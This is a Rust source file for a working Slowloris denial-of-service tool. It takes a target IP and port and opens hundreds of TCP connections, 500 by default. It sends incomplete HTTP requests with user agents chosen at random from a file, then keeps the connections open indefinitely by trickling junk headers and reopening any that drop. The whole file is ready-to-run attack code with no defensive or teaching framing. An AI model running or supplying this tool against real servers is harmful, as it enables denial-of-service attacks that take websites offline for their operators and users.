use std::io::Write;
use std::net::{IpAddr, SocketAddr, TcpStream};
use rand::{random, Rng};
use clap::{Parser};
use std::fs;
use std::path::Path;

#[derive(Parser)]
#[command(author, version, about)]
struct Cli {
    // IP Address targeted
    ip: IpAddr,
    // Port targeted
    port: u16,
    // Number of workers
    #[arg(short, long, default_value_t = 500, help="Specify the number of workers.")]
    workers: u16,
}

struct Worker {
    ip: IpAddr,
    port: u16,
}

impl Worker {
    pub fn create(&self, nb_workers: u16) -> Vec<TcpStream> {
        let mut workers = vec![];
        for _i in 0..nb_workers {
            workers.push(Worker::new_instance(&self));
        }
        workers
    }

    pub fn new_instance(&self) -> TcpStream {
        let mut s = TcpStream::connect(SocketAddr::new(self.ip, self.port))
            .expect("Impossible to connect to the target.");
        s.write_all(
            format!(
                "GET /?{} HTTP/1.1\r\nUser-Agent: {}\r\nConnection: keep-alive\r\n",
                random::<i8>(),
                random_agent()
            ).as_bytes(),
        ).expect("Impossible to send the data to the target.");
        s
    }
}

fn random_agent () -> String {
    let project_root = env!("CARGO_MANIFEST_DIR");
    let path = Path::new(project_root).join("user-agents.txt");
    let file = fs::read_to_string(&path).expect("Impossible to read the user-agents file.");
    let agent: Vec<&str> = file.lines().collect();
    let random_line = rand::thread_rng().gen_range(0..agent.len());

    agent[random_line].to_string()
}

fn main () {
    let args = Cli::parse();
    let nb_workers: u16 = args.workers;

    let instance = Worker {
        ip: args.ip,
        port: args.port
    };

    println!("Making workers...");

    let mut workers: Vec<TcpStream> = instance.create(nb_workers);

    println!("Slowloris attack has begun...");
    loop {
        for worker in &mut workers {
            match worker.write_all(format!("X-a: {}\r\n", random::<i8>()).as_bytes()) {
                Ok(_) => (),
                Err(_) => {
                    println!("Recreating worker : {:?}", worker);
                    *worker = instance.new_instance();
                },
            };
        }
    }
}